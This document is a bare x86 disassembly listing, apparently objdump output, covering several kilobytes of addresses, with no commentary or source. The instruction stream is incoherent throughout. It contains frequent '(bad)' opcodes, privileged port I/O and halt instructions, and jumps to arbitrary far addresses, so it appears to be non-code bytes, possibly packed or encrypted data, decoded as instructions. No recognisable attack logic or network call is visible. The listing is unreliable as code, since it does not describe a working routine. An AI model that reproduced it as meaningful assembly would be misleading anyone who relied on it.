  42359d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42359e:	loop   0x423529
  4235a0:	sbb    BYTE PTR [esp+esi*1],bh
  4235a3:	add    esi,DWORD PTR [edi+0x588437d1]
  4235a9:	push   ss
  4235aa:	fcomip st,st(6)
  4235ac:	add    al,0xa1
  4235ae:	xor    eax,0xe33dde4a
  4235b3:	pop    ecx
  4235b4:	mov    edi,0xc259d587
  4235b9:	adc    esi,DWORD PTR [edi]
  4235bb:	test   BYTE PTR [ebp-0x4f30b71],cl
  4235c1:	adc    eax,DWORD PTR [eax]
  4235c3:	adc    BYTE PTR [ecx+0x624bedd5],dl
  4235c9:	hlt    
  4235ca:	cmp    DWORD PTR [edi+0x41],0x3b1a59eb
  4235d1:	lahf   
  4235d2:	fidivr DWORD PTR [ebx-0x20619753]
  4235d8:	into   
  4235d9:	mov    eax,ds:0x172c0d9e
  4235de:	ds mov ebp,0x2e09b80c
  4235e4:	xor    ebx,ebp
  4235e6:	mov    eax,fs:0xef8bc793
  4235ec:	or     ebp,DWORD PTR [edx+0x3a3ce756]
  4235f2:	push   ds
  4235f3:	leave  
  4235f4:	mov    BYTE PTR es:[ebx+0x761134e6],al
  4235fb:	aam    0x31
  4235fd:	int3   
  4235fe:	and    eax,0x575bf5a6
  423603:	cmp    al,0x3b
  423605:	jg     0x42363c
  423607:	add    dh,ch
  423609:	dec    edx
  42360a:	jl     0x42365d
  42360c:	not    DWORD PTR [esi*8+0x4d8c1531]
  423613:	gs leave 
  423615:	lock mov edx,0x376d8925
  42361b:	fbld   TBYTE PTR [edx]
  42361d:	add    al,BYTE PTR [ecx-0x1c]
  423620:	outs   dx,BYTE PTR ds:[esi]
  423621:	adc    DWORD PTR [edi],0x10c77c55
  423627:	push   es
  423628:	cmp    al,0xa
  42362a:	aaa    
  42362b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42362c:	cmp    al,0xe3
  42362e:	inc    eax
  42362f:	sbb    BYTE PTR [esi+eax*4-0x79],dh
  423633:	arpl   WORD PTR [ebx+eax*8],ax
  423636:	out    0xf7,al
  423638:	loop   0x4235da
  42363a:	xor    DWORD PTR [ecx+ecx*1+0x6f],ecx
  42363e:	pop    ebp
  42363f:	xchg   BYTE PTR [eax],bl
  423641:	push   ebx
  423642:	inc    ebx
  423643:	sbb    al,0xe2
  423645:	(bad)  
  423647:	mov    ah,0x9d
  423649:	(bad)  
  42364a:	out    dx,al
  42364b:	loopne 0x42366b
  42364d:	push   0x4de83965
  423652:	fist   DWORD PTR [edx+0x31c68c41]
  423658:	inc    edi
  423659:	cwde   
  42365a:	gs call 0xd0db:0xc1fa666f
  423662:	rcl    DWORD PTR [edx+0x652f0bc2],0x23
  423669:	bound  esp,QWORD PTR [ebx]
  42366b:	cmc    
  42366c:	int3   
  42366d:	cld    
  42366e:	ret    0xc6e
  423671:	jo     0x423667
  423673:	sub    edi,DWORD PTR [ebx]
  423675:	inc    edx
  423676:	aam    0xf2
  423678:	push   ebx
  423679:	adc    DWORD PTR [edx],ebp
  42367b:	ds jecxz 0x423647
  42367e:	push   edx
  42367f:	lods   eax,DWORD PTR ds:[esi]
  423680:	test   al,0x73
  423682:	mov    al,0xa1
  423684:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423686:	(bad)  
  423687:	pop    ebp
  423688:	xchg   ebp,eax
  423689:	jle    0x423689
  42368b:	(bad)  
  42368c:	ds popf 
  42368e:	and    esp,DWORD PTR [ebx]
  423690:	jns    0x423619
  423692:	ror    DWORD PTR [ecx-0x50899bee],0xc3
  423699:	mov    ds,WORD PTR [edi-0x33219f4e]
  42369f:	shl    BYTE PTR [ebp+0x6d],cl
  4236a2:	pop    edi
  4236a3:	scas   eax,DWORD PTR es:[edi]
  4236a4:	or     bl,BYTE PTR [esp+edi*4]
  4236a7:	inc    ebp
  4236a8:	out    0xe9,al
  4236aa:	pushf  
  4236ab:	test   eax,0x327e53c9
  4236b0:	lahf   
  4236b1:	lahf   
  4236b2:	in     al,dx
  4236b3:	xchg   esi,eax
  4236b4:	imul   BYTE PTR [ecx-0x5fc2584f]
  4236ba:	cli    
  4236bb:	push   ebp
  4236bc:	mov    cs,WORD PTR [ecx]
  4236be:	or     al,0x3f
  4236c0:	(bad)  
  4236c1:	shl    dl,1
  4236c3:	shl    BYTE PTR [esi+0x52],cl
  4236c6:	add    BYTE PTR [esi-0x5a],al
  4236c9:	add    DWORD PTR [ebp+esi*1+0x77eb9df3],eax
  4236d0:	(bad)  
  4236d1:	call   0x53a794f3
  4236d6:	dec    esi
  4236d7:	ret    0x9e00
  4236da:	std    
  4236db:	out    0x35,al
  4236dd:	out    dx,al
  4236de:	adc    BYTE PTR [edx],ah
  4236e0:	mov    ebx,0x1ed11c99
  4236e5:	push   esp
  4236e6:	inc    eax
  4236e7:	sbb    DWORD PTR [ecx],0xffffff8a
  4236ea:	fbld   TBYTE PTR [ebx-0x42]
  4236ed:	sahf   
  4236ee:	dec    eax
  4236ef:	mov    cl,0x42
  4236f1:	out    dx,eax
  4236f2:	pop    edi
  4236f3:	cmc    
  4236f4:	jp     0x423706
  4236f6:	and    edi,DWORD PTR [edx-0x1d]
  4236f9:	and    BYTE PTR [eax+0x7fac842e],0xa0
  423700:	loopne 0x4236fe
  423702:	fst    QWORD PTR [ebx]
  423704:	dec    ebp
  423705:	push   esp
  423706:	test   DWORD PTR [ecx],esi
  423708:	test   eax,0x30ce30c6
  42370d:	xchg   edi,eax
  42370e:	aam    0xa2
  423710:	mov    fs,WORD PTR [ebx]
  423712:	es lods eax,DWORD PTR ss:[esi]
  423715:	hlt    
  423716:	out    dx,eax
  423717:	sub    bl,dl
  423719:	fbstp  TBYTE PTR [ecx]
  42371b:	inc    ebx
  42371c:	sti    
  42371d:	repnz test ebp,edx
  423720:	mov    bl,0x47
  423722:	scas   eax,DWORD PTR es:[edi]
  423723:	out    dx,al
  423724:	push   cs
  423725:	loop   0x4236f1
  423727:	xor    al,0x3f
  423729:	and    BYTE PTR [eax-0x71],dh
  42372c:	mov    cl,0x66
  42372e:	out    0x7d,eax
  423730:	daa    
  423731:	or     DWORD PTR [edi+ecx*1],edx
  423734:	adc    DWORD PTR [esi-0x44c7c116],edi
  42373a:	or     eax,0xfaf49fb1
  42373f:	push   ebx
  423740:	cli    
  423741:	jp     0x423746
  423743:	jl     0x423792
  423745:	xchg   BYTE PTR [ebx],al
  423747:	mov    WORD PTR [esi+0x6d37f2ee],fs
  42374d:	pop    esp
  42374e:	mov    cs,eax
  423750:	push   ebp
  423751:	sub    al,0x76
  423753:	xchg   edi,eax
  423754:	sar    ch,0xd1
  423757:	jg     0x4237c2
  423759:	pop    esi
  42375a:	sub    esp,DWORD PTR [eax+ebx*8-0x72]
  42375e:	or     ebx,DWORD PTR [eax-0x4e59a636]
  423764:	(bad)  [edi]
  423766:	leave  
  423767:	inc    esp
  423768:	lock cli 
  42376a:	dec    edx
  42376b:	jo     0x423754
  42376d:	je     0x423702
  42376f:	jle    0x4237d7
  423771:	and    eax,0x3e7c9063
  423776:	stc    
  423777:	xchg   esi,eax
  423778:	sub    eax,0xc17c61c0
  42377d:	pop    ebx
  42377e:	cmp    dh,BYTE PTR [ebx+0x534af1ea]
  423784:	xchg   edi,eax
  423785:	jns    0x4237cc
  423787:	and    al,0x9d
  423789:	out    dx,al
  42378a:	xor    ebx,DWORD PTR [edi-0xa470bc4]
  423790:	lea    ebp,[edi+ebx*8-0x3c]
  423794:	xor    bl,BYTE PTR [ebp+ecx*2+0x2fd0b673]
  42379b:	bnd jns 0x42374a
  42379e:	adc    ecx,DWORD PTR [ebx+0x3bbe479f]
  4237a4:	push   es
  4237a5:	sbb    dl,BYTE PTR [ebx]
  4237a7:	adc    al,0x5a
  4237a9:	arpl   WORD PTR [esi-0x25],di
  4237ac:	sbb    DWORD PTR [ecx-0x6b9dff9c],0xf40d61e5
  4237b6:	sub    BYTE PTR [ebx+0x41],ch
  4237b9:	sbb    bl,bl
  4237bb:	xor    bl,ch
  4237bd:	jb     0x423741
  4237bf:	mov    ebp,0x9ae3a56e
  4237c4:	(bad)  
  4237c5:	or     ah,bl
  4237c7:	popf   
  4237c8:	add    bh,ch
  4237ca:	cld    
  4237cb:	dec    esp
  4237cc:	inc    ecx
  4237cd:	jbe    0x42378a
  4237cf:	mov    al,0x2a
  4237d1:	cld    
  4237d2:	adc    eax,0x1ccc63c7
  4237d7:	loope  0x423784
  4237d9:	dec    ecx
  4237da:	jb     0x4237a0
  4237dc:	adc    BYTE PTR [edi+0x6],dl
  4237df:	add    edx,esi
  4237e1:	pop    ecx
  4237e2:	mov    ch,0xbd
  4237e4:	mov    ebx,0x48550f18
  4237e9:	shl    DWORD PTR [edx+ecx*2],1
  4237ec:	jo     0x423779
  4237ee:	mov    dl,0x6b
  4237f0:	xor    DWORD PTR [esi],esp
  4237f2:	dec    edx
  4237f3:	pop    ebp
  4237f4:	mov    al,BYTE PTR [ebp-0x3c]
  4237f7:	hlt    
  4237f8:	into   
  4237f9:	mul    bl
  4237fb:	or     al,0x63
  4237fd:	enter  0x8520,0xf7
  423801:	jbe    0x4237af
  423803:	jg     0x423839
  423805:	fmul   QWORD PTR [ebx]
  423807:	aas    
  423808:	push   ds
  423809:	push   esp
  42380a:	inc    esp
  42380b:	mov    eax,ds:0x580dbd13
  423810:	xchg   DWORD PTR [edx-0x2d],ebp
  423813:	aad    0xb1
  423815:	add    eax,0x98c42bc3
  42381a:	cmp    DWORD PTR [eax-0x1a705bcc],ebp
  423820:	fstp   DWORD PTR [edi]
  423822:	pop    ecx
  423823:	ins    DWORD PTR es:[edi],dx
  423824:	dec    ebp
  423825:	pop    ds
  423826:	fwait
  423827:	pop    ss
  423828:	aad    0x25
  42382a:	dec    esp
  42382b:	or     BYTE PTR [edi-0x6c2f8218],cl
  423831:	add    ah,BYTE PTR [edx]
  423833:	(bad)  
  423835:	loop   0x4237ef
  423837:	or     al,0xc5
  423839:	mov    edx,0x4f9a6635
  42383e:	and    al,0x1c
  423840:	mov    ah,0x4d
  423842:	adc    al,0x67
  423844:	pusha  
  423845:	xchg   esi,eax
  423846:	push   0x6b
  423848:	mov    ebp,0xf3ad6b23
  42384d:	mov    cl,0x37
  42384f:	shl    WORD PTR [esi+0x10d3fa17],1
  423856:	push   0x761bd434
  42385b:	in     eax,0x19
  42385d:	cmp    bl,BYTE PTR [esi-0x7095b277]
  423863:	ud2    
  423865:	xchg   esp,eax
  423866:	mov    WORD PTR [ebp-0x2f5eb7f5],gs
  42386c:	lds    eax,FWORD PTR [ecx+0x666fa5f3]
  423872:	test   DWORD PTR [esp+ebx*2],eax
  423875:	push   es
  423876:	cdq    
  423877:	add    ah,bl
  423879:	jg     0x4238ef
  42387b:	rcr    BYTE PTR [ebx+eiz*1+0x47],0xb5
  423880:	sbb    DWORD PTR [edx+0x10],ebp
  423883:	data16 daa 
  423885:	xor    al,BYTE PTR [edx]
  423887:	fstp   QWORD PTR [edi-0x14]
  42388a:	mov    edx,ebx
  42388c:	ror    ecx,cl
  42388e:	xchg   ebp,eax
  42388f:	cdq    
  423890:	pop    esi
  423891:	mov    ch,BYTE PTR [ebp+eax*8-0x42f8fd4b]
  423898:	jmp    0x81ada6a0
  42389d:	inc    eax
  42389e:	mov    ebx,0x9a451a0
  4238a3:	xor    DWORD PTR [esi-0xd],edi
  4238a6:	add    eax,0xb7fc1ba9
  4238ab:	sbb    esp,DWORD PTR [ecx+0x4799df84]
  4238b1:	mov    cl,0x33
  4238b3:	mov    ebx,0x86be799c
  4238b8:	sar    DWORD PTR [edi+ebx*2],0x79
  4238bc:	push   edx
  4238bd:	fs leave 
  4238bf:	mov    bh,0xf6
  4238c1:	loope  0x4238c1
  4238c3:	jg     0x423880
  4238c5:	test   al,0x4d
  4238c7:	jb     0x423857
  4238c9:	fdiv   DWORD PTR [ecx]
  4238cb:	loopne 0x4238fe
  4238cd:	or     esi,DWORD PTR [edx+0x1ba8739b]
  4238d3:	loop   0x42390d
  4238d5:	sar    BYTE PTR [edx-0xc],0xf5
  4238d9:	int3   
  4238da:	ret    
  4238db:	mov    esi,0xdbf615b0
  4238e0:	sub    dl,ch
  4238e2:	xor    BYTE PTR [ebx+0x319fc1f5],bl
  4238e8:	leave  
  4238e9:	bound  ecx,QWORD PTR [edx+edx*1-0x76422d09]
  4238f0:	(bad)  
  4238f1:	jno    0x423882
  4238f3:	ret    0x7481
  4238f6:	ret    0x1b94
  4238f9:	push   esi
  4238fa:	mov    esi,0x564acc67
  4238ff:	fdivp  st(3),st
  423901:	or     edx,0xffffffd7
  423904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423905:	cs je  0x42389a
  423908:	adc    esp,DWORD PTR [edi]
  42390a:	pusha  
  42390b:	sbb    bl,BYTE PTR [esi-0x73]
  42390e:	gs xor al,0x7c
  423911:	std    
  423912:	push   0xcdb332a2
  423917:	sbb    DWORD PTR [ecx-0x4a],esp
  42391a:	sub    al,0x82
  42391c:	push   ebx
  42391d:	jl     0x42399b
  42391f:	cmp    al,ch
  423921:	mov    ebp,0xf31c720e
  423926:	fwait
  423927:	cmc    
  423928:	sar    DWORD PTR ds:0xd76f6c40,0x71
  42392f:	push   ebx
  423930:	jnp    0x4239ad
  423932:	push   0x8eeff91e
  423937:	hlt    
  423938:	adc    eax,0x920ba313
  42393d:	push   es
  42393e:	xor    edi,DWORD PTR [ecx]
  423940:	mov    ds:0x60efc7b,eax
  423945:	retf   
  423946:	xor    bl,BYTE PTR [edi-0x10]
  423949:	hlt    
  42394a:	jmp    0xfeae:0x3f882645
  423951:	or     ch,dl
  423953:	dec    eax
  423954:	mov    BYTE PTR [ecx+0x2fefba6c],ch
  42395a:	fs cli 
  42395c:	fwait
  42395d:	add    esi,DWORD PTR [edi-0x28b379d1]
  423963:	imul   ebp,DWORD PTR [edx+edx*8+0x4b0ee3e9],0x98dc46ee
  42396e:	sar    BYTE PTR [ebx],1
  423970:	and    esp,DWORD PTR [ebx+0x8d25139]
  423976:	mov    edi,0x32f09059
  42397b:	sbb    BYTE PTR [eax+0x3a6961d9],bl
  423981:	call   0xa4ac:0x3196483c
  423988:	push   ebx
  423989:	mov    DWORD PTR [eax+ebp*8],esp
  42398c:	push   edx
  42398d:	div    bl
  42398f:	lock cmp BYTE PTR [edx],ch
  423992:	dec    ebx
  423993:	mov    edx,DWORD PTR [ecx+0x52]
  423996:	fwait
  423997:	ret    
  423998:	mov    al,0x82
  42399a:	pop    edx
  42399b:	adc    al,0xc9
  42399d:	hlt    
  42399e:	add    ch,BYTE PTR [ebp+0x44ef074a]
  4239a4:	pop    edx
  4239a5:	hlt    
  4239a6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4239a8:	pushf  
  4239a9:	fwait
  4239aa:	arpl   WORD PTR [edi],ax
  4239ac:	mov    edi,0x93b4f047
  4239b1:	fadd   QWORD PTR [edi-0x4ccf28a2]
  4239b7:	pushf  
  4239b8:	ret    0xb4d9
  4239bb:	push   0x19a00d72
  4239c0:	shl    DWORD PTR [edi-0x48],0x9
  4239c4:	popf   
  4239c5:	sub    cl,ch
  4239c7:	aam    0x5d
  4239c9:	inc    ebx
  4239ca:	call   0xaa12:0x92d9fae3
  4239d1:	mov    ebp,0xd604fe34
  4239d6:	jno    0x42395a
  4239d8:	mov    eax,ds:0x9358dd9e
  4239dd:	xchg   ebx,eax
  4239de:	mov    ch,0xd3
  4239e0:	data16 fcomp QWORD PTR [edi]
  4239e3:	mul    DWORD PTR [ecx+0x52471086]
  4239e9:	mov    ecx,0x88bb9d8f
  4239ee:	push   edi
  4239ef:	jno    0x423a3c
  4239f1:	mov    BYTE PTR [eax],dh
  4239f3:	mov    eax,0xaefd8cc0
  4239f8:	mov    ah,0xf4
  4239fa:	nop
  4239fb:	test   al,0xc3
  4239fd:	mov    ch,0xc9
  4239ff:	(bad)  
  423a00:	or     DWORD PTR [ecx+ecx*4],edi
  423a03:	push   edi
  423a04:	lock les ebx,FWORD PTR [ebx-0x27010193]
  423a0b:	xor    al,0xe5
  423a0d:	xchg   BYTE PTR ds:[edx],bl
  423a10:	push   ds
  423a11:	jle    0x423993
  423a13:	test   al,0x0
  423a15:	cs adc al,0x97
  423a18:	cld    
  423a19:	ret    0x397f
  423a1c:	cmp    ebp,edx
  423a1e:	mov    al,BYTE PTR [eax+0x6e]
  423a21:	xchg   esi,eax
  423a22:	jno    0x423a8e
  423a24:	add    eax,0x5277d413
  423a29:	addr16 add eax,0x15164cb5
  423a2f:	sbb    ebx,DWORD PTR [esi+edx*8-0x5f]
  423a33:	sbb    esi,esi
  423a35:	imul   edx,DWORD PTR [ecx*1-0x3e96dba4],0x94c51b41
  423a40:	fsubr  DWORD PTR [eax]
  423a42:	sub    edx,edx
  423a44:	xchg   edi,ebx
  423a46:	shl    BYTE PTR [eax-0x6319f765],0xa
  423a4d:	ja     0x423a4f
  423a4f:	hlt    
  423a50:	stos   DWORD PTR es:[edi],eax
  423a51:	mov    ecx,0x7d46a0bd
  423a56:	loopne 0x423a3a
  423a58:	shr    BYTE PTR [ecx+esi*1+0x8],cl
  423a5c:	daa    
  423a5d:	call   0x92d0:0x80024db7
  423a64:	push   ss
  423a65:	add    DWORD PTR [ecx+0x7ce9d06a],0x74
  423a6c:	xchg   esi,eax
  423a6d:	dec    edx
  423a6e:	fs mov esp,0x70a913f
  423a74:	int3   
  423a75:	imul   edi,DWORD PTR [edi+0x69],0xce8fe94a
  423a7c:	push   edx
  423a7d:	out    dx,al
  423a7e:	push   0x308a7832
  423a83:	xchg   esi,eax
  423a84:	or     ebp,DWORD PTR [esi-0x39b91a37]
  423a8a:	xchg   esi,eax
  423a8b:	popa   
  423a8c:	lahf   
  423a8d:	and    eax,0xa9ca579a
  423a92:	leave  
  423a93:	xchg   ecx,eax
  423a94:	push   ebx
  423a95:	fdiv   QWORD PTR [edi+0x2fd0409b]
  423a9b:	mov    al,0x85
  423a9d:	or     BYTE PTR [eax],0x25
  423aa0:	sbb    esp,DWORD PTR ss:[ecx+0x23]
  423aa4:	push   0x737e2430
  423aa9:	mov    cl,0x44
  423aab:	(bad)  
  423aac:	pop    edx
  423aad:	sbb    eax,0x679bddce
  423ab2:	es mov ah,0xb2
  423ab5:	inc    edi
  423ab6:	stc    
  423ab7:	test   al,0x15
  423ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423abb:	and    al,0x10
  423abd:	or     al,0x11
  423abf:	arpl   WORD PTR [ebp+edi*2-0x2680bff7],di
  423ac6:	mov    edi,0x87abb22a
  423acb:	dec    ebx
  423acc:	xchg   edx,eax
  423acd:	push   ecx
  423ace:	mov    edx,DWORD PTR [ebp-0x1fa4a62b]
  423ad4:	sbb    al,0x6a
  423ad6:	sbb    BYTE PTR [esi+0x2428b85e],cl
  423adc:	fsub   DWORD PTR [edx-0x1154a380]
  423ae2:	mov    eax,ds:0x703a30c0
  423ae7:	retf   0x5b3e
  423aea:	add    eax,0x2e4406c
  423aef:	and    eax,0xa1410624
  423af4:	adc    esi,ecx
  423af6:	aad    0xc1
  423af8:	clc    
  423af9:	(bad)  
  423afa:	push   eax
  423afb:	jmp    0x423aa5
  423afd:	cdq    
  423afe:	dec    ebx
  423aff:	mov    dh,0xd
  423b01:	mov    al,0xd4
  423b03:	push   ebp
  423b04:	inc    ecx
  423b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b06:	in     al,0x27
  423b08:	push   es
  423b09:	jmp    0x3648d6cb
  423b0e:	test   DWORD PTR [ecx+0x1d57ec0e],ebx
  423b14:	lea    esp,[esi+edi*8-0x11]
  423b18:	fwait
  423b19:	pop    eax
  423b1a:	(bad)  
  423b1b:	ds je  0x423b39
  423b1e:	mov    WORD PTR [eax],es
  423b20:	loopne 0x423ab7
  423b22:	dec    eax
  423b23:	add    bl,al
  423b25:	les    edi,FWORD PTR [eax+0x38877e68]
  423b2b:	sbb    ecx,DWORD PTR [edx+ebx*8]
  423b2e:	pop    ds
  423b2f:	scas   eax,DWORD PTR es:[edi]
  423b30:	inc    BYTE PTR [eax]
  423b32:	mov    ebx,0x34b4e491
  423b37:	call   0xb96f5f0a
  423b3c:	shl    BYTE PTR [edi-0x17b87ef],cl
  423b42:	add    eax,0x67dd5f54
  423b47:	outs   dx,DWORD PTR ds:[esi]
  423b48:	xchg   esi,eax
  423b49:	out    0x2d,al
  423b4b:	fsub   st(0),st
  423b4d:	nop
  423b4e:	cwde   
  423b4f:	ret    0x7927
  423b52:	test   DWORD PTR [ecx+eax*4],esp
  423b55:	cmp    DWORD PTR ds:[edx+edx*1],ecx
  423b59:	add    BYTE PTR [ebx+ecx*4-0x730a9ac3],ah
  423b60:	or     bl,bh
  423b62:	retf   
  423b63:	ret    0x8886
  423b66:	ret    0xd445
  423b69:	jo     0x423ba5
  423b6b:	shr    DWORD PTR [ecx],1
  423b6d:	mov    bl,0xd3
  423b6f:	jmp    0x3ab5:0xf7af5a1c
  423b76:	out    0xca,eax
  423b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b79:	(bad)  
  423b7a:	xchg   edx,eax
  423b7b:	imul   ebp,esp,0xffffffde
  423b7e:	lods   eax,DWORD PTR ds:[esi]
  423b7f:	xchg   ebx,eax
  423b80:	ret    
  423b81:	xchg   esp,eax
  423b82:	retf   
  423b83:	push   0x6ad9194c
  423b88:	xchg   edx,eax
  423b89:	hlt    
  423b8a:	xchg   esi,eax
  423b8b:	inc    edx
  423b8c:	jle    0x423b16
  423b8e:	pop    ebx
  423b8f:	dec    esi
  423b90:	data16 fadd st(6),st
  423b94:	sub    al,0xe5
  423b96:	test   BYTE PTR [edi+0x61b9269b],cl
  423b9c:	add    eax,0x4c51cc71
  423ba1:	mov    WORD PTR [ebx],?
  423ba3:	xor    al,0x40
  423ba5:	dec    edx
  423ba6:	hlt    
  423ba7:	or     esi,DWORD PTR [ebp+0x553e8695]
  423bad:	xchg   esi,eax
  423bae:	pop    ds
  423baf:	sti    
  423bb0:	or     BYTE PTR [edx-0x2ad09aee],al
  423bb6:	jmp    0x9739b1d
  423bbb:	mov    edx,0xf6e75128
  423bc0:	xor    ebp,0xffffff9d
  423bc3:	fs cmp eax,0xa6194a2
  423bc9:	sbb    DWORD PTR [esi+0x4d],ecx
  423bcc:	iret   
  423bcd:	fild   QWORD PTR [eax]
  423bcf:	sub    al,0xc3
  423bd1:	ret    0x95ed
  423bd4:	stos   BYTE PTR es:[edi],al
  423bd5:	dec    ebx
  423bd6:	push   cs
  423bd7:	dec    ebp
  423bd8:	sub    eax,0x189c0d1e
  423bdd:	cwde   
  423bde:	clc    
  423bdf:	mov    BYTE PTR [edx],dl
  423be1:	pop    ebp
  423be2:	xor    eax,0xdd6a5eff
  423be7:	xor    eax,0xe00ec6
  423bec:	int3   
  423bed:	call   0xfbf7c014
  423bf2:	pop    edx
  423bf3:	and    BYTE PTR [eax],bl
  423bf5:	(bad)  
  423bf6:	jnp    0x423c5f
  423bf8:	mov    al,0x23
  423bfa:	aam    0xce
  423bfc:	add    eax,0x833cc098
  423c01:	jnp    0x423bfd
  423c03:	add    edi,DWORD PTR [ebp+0x42]
  423c06:	dec    ebx
  423c07:	not    DWORD PTR [edi+0x75ef5ea]
  423c0d:	lock jg 0x423ba4
  423c10:	fidiv  DWORD PTR [ebp+0x512d1201]
  423c16:	mov    dh,0xf1
  423c18:	mov    dh,0xbb
  423c1a:	mov    ds:0x40d54d7e,eax
  423c1f:	add    DWORD PTR [ecx+0x170b98a3],0xffffff87
  423c26:	lahf   
  423c27:	mov    eax,0x5d7dff4a
  423c2c:	push   es
  423c2d:	(bad)  
  423c2e:	xchg   ebp,eax
  423c2f:	jle    0x423c4a
  423c31:	lods   eax,DWORD PTR ds:[esi]
  423c32:	pop    ds
  423c33:	cld    
  423c34:	and    DWORD PTR [eax+0x207cd583],eax
  423c3a:	rol    edx,0xd8
  423c3d:	and    BYTE PTR ds:0xb773097a,bl
  423c43:	mov    esp,0x78ce3cd2
  423c48:	adc    al,0x6f
  423c4a:	enter  0x801f,0xf0
  423c4e:	pop    eax
  423c4f:	dec    ebp
  423c50:	xor    ebx,edx
  423c52:	pop    es
  423c53:	push   cs
  423c54:	and    DWORD PTR [ecx-0x1b2c2269],ecx
  423c5a:	test   DWORD PTR [ecx],0x1c8dee0b
  423c60:	sub    BYTE PTR [ebx+0xf4c43b5],dh
  423c66:	inc    esi
  423c67:	xor    al,0x21
  423c69:	sbb    ah,BYTE PTR [eax+0x15348410]
  423c6f:	(bad)  
  423c70:	rol    DWORD PTR [ebp-0x430881d3],cl
  423c76:	clc    
  423c77:	bound  ebp,QWORD PTR [ebx]
  423c79:	(bad)  
  423c7a:	xchg   ecx,eax
  423c7b:	xchg   bl,bh
  423c7d:	out    0xd5,al
  423c7f:	sbb    DWORD PTR [edi+0x3927d78a],esp
  423c85:	push   ss
  423c86:	dec    edi
  423c87:	push   ss
  423c88:	not    ch
  423c8a:	mov    ss,WORD PTR [edi+0x100e1181]
  423c90:	mov    cl,0xb5
  423c92:	pop    edi
  423c93:	jns    0x423cb2
  423c95:	jg     0x423d15
  423c97:	mov    edx,0x0
	...
  423d14:	retf   0xe76a
  423d17:	ja     0x423d00
  423d19:	(bad)  
  423d1a:	(bad)  
  423d1c:	daa    
  423d1d:	inc    ebx
  423d1e:	call   0xfc364e9d
  423d23:	sti    
  423d24:	(bad)  
  423d26:	add    DWORD PTR [eax],eax
  423d28:	ins    BYTE PTR es:[edi],dx
  423d29:	pop    es
  423d2a:	add    BYTE PTR [eax],al
  423d2c:	das    
  423d2d:	adc    DWORD PTR [ebx],ecx
  423d2f:	xlat   BYTE PTR ds:[ebx]
  423d30:	ret    0x9494
  423d33:	sub    edx,ebx
  423d35:	add    bh,BYTE PTR [edx+0x13]
  423d38:	gs cmp al,cl
  423d3b:	in     al,0xf
  423d3d:	mov    ecx,0x7d0056ca
  423d42:	and    eax,0x15ebefaf
  423d47:	rol    ebp,1
  423d49:	sub    edi,DWORD PTR [eax+eax*4+0x5]
  423d4d:	and    al,0x8a
  423d4f:	sbb    eax,0x28841635
  423d54:	fs imul ebp,esi,0xf446fbf6
  423d5b:	fisub  WORD PTR [ebx+0x73]
  423d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d5f:	retf   
  423d60:	mov    al,0xdf
  423d62:	jne    0x423cf4
  423d64:	pop    edx
  423d65:	mov    ebp,0xe4737cf2
  423d6a:	sti    
  423d6b:	cld    
  423d6c:	(bad)  
  423d6d:	aas    
  423d6e:	xchg   esi,eax
  423d6f:	leave  
  423d70:	push   eax
  423d71:	ja     0x423dcb
  423d73:	out    0x53,al
  423d75:	rcl    DWORD PTR [edx-0x18],cl
  423d78:	xchg   esi,eax
  423d79:	mov    cl,BYTE PTR [ebp-0xab2def]
  423d7f:	add    ah,ch
  423d81:	shr    DWORD PTR [esi],0x29
  423d84:	ja     0x423dc9
  423d86:	test   BYTE PTR [eax+ebp*8-0x27afe66],dh
  423d8d:	jbe    0x423d61
  423d8f:	mov    cl,0x5b
  423d91:	pop    ecx
  423d92:	lahf   
  423d93:	stos   BYTE PTR es:[edi],al
  423d94:	(bad)  ds:0x22645b3
  423d9a:	jmp    0x9e5b:0x87094464
  423da1:	ucomiss xmm7,DWORD PTR [ebx]
  423da4:	(bad)  
  423da5:	(bad)  [edx]
  423da7:	ficomp WORD PTR [edx-0x5e]
  423daa:	jmp    0x423db0
  423dac:	scas   al,BYTE PTR es:[edi]
  423dad:	in     al,0xdd
  423daf:	cwde   
  423db0:	jmp    0x52fc:0x32aefeca
  423db7:	hlt    
  423db8:	(bad)  
  423db9:	mov    dl,0x9a
  423dbb:	lods   eax,DWORD PTR ds:[esi]
  423dbc:	xor    BYTE PTR [edi+0x1359d43],ah
  423dc2:	stc    
  423dc3:	ficom  DWORD PTR [edx+0x36]
  423dc6:	adc    BYTE PTR [ebx+0x7f],0x49
  423dca:	xchg   ecx,eax
  423dcb:	loopne 0x423e0f
  423dcd:	sbb    DWORD PTR [ebp+0x24],eax
  423dd0:	jecxz  0x423e08
  423dd2:	pop    ss
  423dd3:	sub    esp,eax
  423dd5:	addr16 mov eax,ds:0xb645
  423dd9:	seto   BYTE PTR [ebp-0x80]
  423ddd:	mov    fs,WORD PTR [edx-0x36522a3a]
  423de3:	loope  0x423dc0
  423de5:	xchg   edi,eax
  423de6:	imul   ecx,DWORD PTR [ecx+eax*4+0x3e0f074b],0xffffff92
  423dee:	inc    edi
  423def:	shr    esi,cl
  423df1:	inc    edx
  423df2:	sub    edi,edi
  423df4:	add    BYTE PTR [esi],dh
  423df6:	nop
  423df7:	add    eax,0xe339239d
  423dfc:	ror    ecx,1
  423dfe:	inc    ebx
  423dff:	sbb    eax,0x7c13983d
  423e04:	and    BYTE PTR [ecx-0x3e9f6e70],bh
  423e0a:	(bad)  
  423e0b:	mov    ch,0xe7
  423e0d:	leave  
  423e0e:	mov    ah,0x10
  423e10:	jns    0x423e83
  423e12:	leave  
  423e13:	dec    edx
  423e14:	dec    esi
  423e15:	ret    
  423e16:	out    0x5f,al
  423e18:	ins    BYTE PTR es:[edi],dx
  423e19:	mov    al,ds:0x72d857c1
  423e1e:	cmp    al,0x85
  423e20:	mov    ebp,0x2e3989a4
  423e25:	loopne 0x423dc0
  423e27:	scas   al,BYTE PTR es:[edi]
  423e28:	xchg   esi,eax
  423e29:	adc    BYTE PTR [esi],ah
  423e2b:	mov    bh,bh
  423e2d:	test   DWORD PTR [ebx-0x22],edi
  423e30:	mov    DWORD PTR [ebx-0x68],ecx
